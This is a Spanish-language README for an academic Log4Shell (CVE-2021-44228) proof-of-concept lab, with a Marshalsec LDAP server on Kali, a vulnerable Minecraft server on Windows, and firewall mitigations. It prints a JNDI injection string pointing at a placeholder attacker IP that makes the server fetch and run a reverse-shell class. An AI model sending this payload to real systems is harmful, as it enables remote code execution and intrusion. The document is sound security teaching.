# PoC Log4Shell (CVE-2021-44228) - Entorno Controlado

Este repositorio contiene los scripts de configuración, el payload y las políticas de mitigación utilizados para la Prueba de Concepto (PoC) de la vulnerabilidad **Log4Shell (CVE-2021-44228)**, desarrollada como parte del trabajo de monografía para el diplomado en Ciberseguridad.

> **⚠️ ADVERTENCIA LEGAL Y ÉTICA:** 
> Todo el código y la información contenida en este repositorio tiene fines **estrictamente académicos y de Hacking Ético**. Fue diseñado para ser ejecutado en un entorno de laboratorio aislado y virtualizado. El autor no se hace responsable del mal uso de estas herramientas. No utilices este código en sistemas que no te pertenezcan o sin autorización expresa.

## 📋 Descripción del Laboratorio

El laboratorio virtualizado recrea un escenario de ataque cliente-servidor utilizando:
*   **Atacante:** Kali Linux (Servidor LDAP malicioso con Marshalsec y oyente Netcat).
*   **Víctima:** Windows 11 (Ejecutando un servidor de Minecraft v1.8.8 vulnerable).
*   **Vector de ataque:** Inyección JNDI a través del chat de la aplicación.

## 📂 Estructura de Archivos

*   `Exploit.java`: Código fuente del payload malicioso (Reverse Shell).
*   `iniciar_servidor.bat`: Script de inicialización del servidor vulnerable en Windows.
*   `descargar_minecraft.ps1`: Script para obtener el aplicativo vulnerable desde fuentes oficiales.
*   `preparar_kali.sh`: Comandos para preparar la infraestructura atacante (JDK 8, Maven, Marshalsec).
*   `mitigacion_firewall.ps1`: Script de remediación (Hardening) implementando políticas Zero Trust.

## 🚀 Resumen de Ejecución (PoC)

1. **Preparación del Atacante (Kali Linux):**
   Se compila `Exploit.java` en un archivo `.class` y se expone mediante un servidor HTTP en el puerto 80.
   Se inicializa un servidor LDAP malicioso utilizando Marshalsec que redirige las peticiones hacia el payload.

2. **Ejecución de la Víctima (Windows 11):**
   Se ejecuta el servidor de Minecraft vulnerable utilizando el script `iniciar_servidor.bat`.

3. **Explotación:**
   Desde el cliente, se envía la siguiente cadena JNDI maliciosa a través de un campo de texto (chat):
   `${jndi:ldap://<IP_KALI>:1389/Exploit}`

4. **Resultado:**
   El servidor vulnerable resuelve la petición LDAP, descarga la clase maliciosa y la ejecuta, otorgando al atacante una Reverse Shell con los privilegios del servicio.

## 🛡️ Mitigación y Remediación

Como parte del análisis, se desarrollaron reglas de defensa en profundidad. El script `mitigacion_firewall.ps1` incluye:
*   Bloqueo de conexiones salientes hacia puertos comunes de explotación JNDI (389, 1389, 1099).
*   Implementación de políticas **Zero Trust** para el ejecutable de Java.

